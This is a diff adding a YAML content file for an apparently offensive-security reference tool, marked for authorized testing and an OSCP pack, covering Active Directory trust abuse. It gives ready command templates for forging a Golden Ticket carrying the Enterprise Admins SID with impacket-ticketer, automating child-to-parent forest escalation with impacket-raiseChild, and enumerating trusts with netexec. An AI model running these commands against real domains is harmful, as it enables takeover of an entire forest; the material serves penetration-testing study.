@@ -1,0 +1,87 @@
+# Cephalo content — AD trusts & cross-forest (AD-11).
+# Authorized testing only. Trust enumeration lives in ad/enum-extra.yaml.
+sections:
+  - id: ad.p10.trusts
+    title: AD Trusts & Cross-forest
+    os: ad
+    phase: lateral-movement
+    order: 134
+    description: Abuse trust relationships — SID history (child→parent) and trust keys.
+    techniques: [ad.trust.sidhistory, ad.trust.interforest]
+    packs: [oscp]
+
+techniques:
+  - id: ad.trust.sidhistory
+    title: SID history abuse (child → parent)
+    os: [ad]
+    phase: lateral-movement
+    summary: Within a forest, escalate from child-domain DA to the forest root via SID history.
+    body: |
+      A forged ticket carrying the Enterprise Admins SID in its SID-history field is
+      honoured across an intra-forest trust (SID filtering is off inside a forest).
+      With the child krbtgt key, forge a Golden Ticket that adds the parent's
+      privileged SID, or let raiseChild automate the whole child→parent path.
+    commands: [ad.trust.sidhistory.ticketer, ad.trust.sidhistory.raisechild]
+    prerequisites: [ad.persist.golden]
+    tags: [pass-the-ticket, persistence, ad]
+    archetypeBand: medium
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.trust.interforest
+    title: Inter-forest trust key abuse
+    os: [ad]
+    phase: lateral-movement
+    summary: Forge an inter-realm TGT from a captured trust key (SID filtering applies).
+    body: |
+      Across a forest trust, the shared trust key signs inter-realm referrals.
+      Abuse is constrained by SID filtering and is highly environment-specific —
+      enumerate the trust, then validate the path before relying on it.
+    commands: [ad.trust.interforest.find]
+    tags: [ad, pass-the-ticket]
+    archetypeBand: low
+    references: [ref.adsecurity]
+    confidence: unverified
+    packs: [oscp]
+
+commands:
+  - id: ad.trust.sidhistory.ticketer
+    title: Golden + extra-SID (ticketer)
+    template: "impacket-ticketer -nthash {{KRBTGT_NTHASH}} -domain-sid {{DOMAIN_SID}} -domain {{DOMAIN}} -extra-sid S-1-5-21-PARENT-519 Administrator"
+    tool: impacket
+    description: Forge a child-domain TGT carrying the parent forest-root Enterprise-Admins SID.
+    os: [ad]
+    phase: lateral-movement
+    tags: [pass-the-ticket]
+    notes:
+      - "Replace the -extra-sid value with the real parent domain SID + the Enterprise Admins RID."
+    confidence: verified
+    references: [ref.impacket]
+    danger: critical
+    packs: [oscp]
+  - id: ad.trust.sidhistory.raisechild
+    title: Automated child→parent (raiseChild)
+    template: "impacket-raiseChild '{{DOMAIN}}/{{USER}}:{{PASS}}'"
+    tool: impacket
+    description: Automate the child-DA → forest-root escalation end to end.
+    os: [ad]
+    phase: lateral-movement
+    tags: [pass-the-ticket]
+    confidence: verified
+    references: [ref.impacket]
+    danger: critical
+    packs: [oscp]
+
+  - id: ad.trust.interforest.find
+    title: Enumerate forest trusts
+    template: "netexec ldap {{DC_IP}} -u '{{USER}}' -p '{{PASS}}' -M enum_trusts"
+    tool: netexec
+    description: List inter-forest trusts and their direction before any abuse.
+    os: [ad]
+    phase: lateral-movement
+    tags: [ad]
+    confidence: unverified
+    references: [ref.adsecurity]
+    danger: low
+    packs: [oscp]
